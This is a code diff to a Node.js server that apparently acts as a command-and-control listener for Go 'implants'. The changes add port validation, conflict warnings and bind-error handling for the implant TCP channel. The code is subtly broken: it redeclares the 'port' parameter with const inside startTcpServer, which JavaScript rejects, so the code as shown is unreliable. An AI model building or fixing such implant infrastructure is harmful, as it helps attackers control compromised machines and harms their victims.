@@ -1228,7 +1228,38 @@ function createTcpServer() {
   return tcpServer;
 }
 
+/** Valid TCP listen port for implants (avoids 0 / NaN from bad DB or env). */
+function normalizeTcpListenPort(raw) {
+  const n = Number(raw);
+  if (Number.isFinite(n) && n > 0 && n < 65536) return Math.floor(n);
+  console.warn('[TCP] Invalid TCP port', raw, '- using 2026');
+  return 2026;
+}
+
+/**
+ * Implant TCP must not share the HTTP server port. If they match (e.g. .env TCP_PORT=5000 with PORT=5000),
+ * use 2026 — the default expected by lastfinalversion2.go.
+ * Ports 80/443 see HTTP/TLS probes → JSON parse errors in logs; warn only.
+ */
+function resolveImplantTcpPort(rawTcpPort, rawHttpPort) {
+  const httpP = normalizeTcpListenPort(rawHttpPort);
+  let tcpP = normalizeTcpListenPort(rawTcpPort);
+  if (tcpP === httpP) {
+    console.warn(
+      `[TCP] TCP_PORT (${tcpP}) cannot equal HTTP PORT (${httpP}). Using 2026 for Go implant TCP. Fix .env: TCP_PORT=2026`
+    );
+    tcpP = 2026;
+  }
+  if (tcpP === 80 || tcpP === 443) {
+    console.warn(
+      `[TCP] Listening on ${tcpP} will get HTTP/TLS scanners (JSON parse errors). Prefer TCP_PORT=2026 for implants.`
+    );
+  }
+  return tcpP;
+}
+
 function startTcpServer(host, port) {
+  const port = normalizeTcpListenPort(port);
   return new Promise((resolve, reject) => {
     const srv = createTcpServer();
     // Attach error handler BEFORE listen to avoid race on immediate DNS errors
@@ -1241,6 +1272,8 @@ function startTcpServer(host, port) {
 }
 
 async function restartTcpServerIfNeeded(newHost, newPort) {
+  const httpPort = Number(process.env.PORT || 5000);
+  const safePort = resolveImplantTcpPort(newPort, httpPort);
   let addr = null;
   if (tcpServer && typeof tcpServer.address === 'function') {
     try {
@@ -1251,17 +1284,20 @@ async function restartTcpServerIfNeeded(newHost, newPort) {
   }
   const currentHost = (addr && addr.address) ? addr.address : '0.0.0.0';
   const currentPort = (addr && addr.port) ? addr.port : null;
-  if (currentPort === newPort && currentHost === newHost) return;
+  if (currentPort === safePort && currentHost === newHost) return;
   if (tcpServer) {
     await new Promise((r) => tcpServer.close(r));
     tcpServer = null;
   }
   try {
-    await startTcpServer(newHost, newPort);
+    await startTcpServer(newHost, safePort);
   } catch (e) {
     if (e && (e.code === 'ENOTFOUND' || e.code === 'EADDRNOTAVAIL')) {
-      console.warn(`[TCP] Failed to bind to ${newHost}:${newPort} (${e.code}). Falling back to 0.0.0.0`);
-      await startTcpServer('0.0.0.0', newPort);
+      console.warn(`[TCP] Failed to bind to ${newHost}:${safePort} (${e.code}). Falling back to 0.0.0.0`);
+      await startTcpServer('0.0.0.0', safePort);
+    } else if (e && e.code === 'EADDRINUSE') {
+      console.error(`[TCP] Port ${safePort} already in use. Stop the other process or set TCP_PORT in .env`);
+      throw e;
     } else {
       throw e;
     }
@@ -1270,19 +1306,28 @@ async function restartTcpServerIfNeeded(newHost, newPort) {
 
 // Start TCP server with settings (env overrides allowed)
 (async () => {
-  await loadDb();
-  const s = getAllSettings();
-  const tcpHost = process.env.TCP_HOST || s.serverHost || '0.0.0.0';
-  const tcpPort = Number(process.env.TCP_PORT || s.serverPort || 2026);
   try {
-    await startTcpServer(tcpHost, tcpPort);
-  } catch (e) {
-    if (e && (e.code === 'ENOTFOUND' || e.code === 'EADDRNOTAVAIL')) {
-      console.warn(`[TCP] Failed to bind to ${tcpHost}:${tcpPort} (${e.code}). Falling back to 0.0.0.0`);
-      await startTcpServer('0.0.0.0', tcpPort);
-    } else {
-      throw e;
+    await loadDb();
+    ensureDefaultSettings();
+    const s = getAllSettings();
+    const tcpHost = process.env.TCP_HOST || s.serverHost || '0.0.0.0';
+    const httpPort = Number(process.env.PORT || 5000);
+    const tcpPort = resolveImplantTcpPort(process.env.TCP_PORT || s.serverPort || 2026, httpPort);
+    try {
+      await startTcpServer(tcpHost, tcpPort);
+    } catch (e) {
+      if (e && (e.code === 'ENOTFOUND' || e.code === 'EADDRNOTAVAIL')) {
+        console.warn(`[TCP] Failed to bind to ${tcpHost}:${tcpPort} (${e.code}). Falling back to 0.0.0.0`);
+        await startTcpServer('0.0.0.0', tcpPort);
+      } else if (e && e.code === 'EADDRINUSE') {
+        console.error(`[TCP] Port ${tcpPort} already in use (${e.message}). Free the port or set TCP_PORT in .env`);
+        throw e;
+      } else {
+        throw e;
+      }
     }
+  } catch (e) {
+    console.error('[TCP] Failed to start TCP listener (Go clients will not connect):', e && e.message, e);
   }
 })();
 
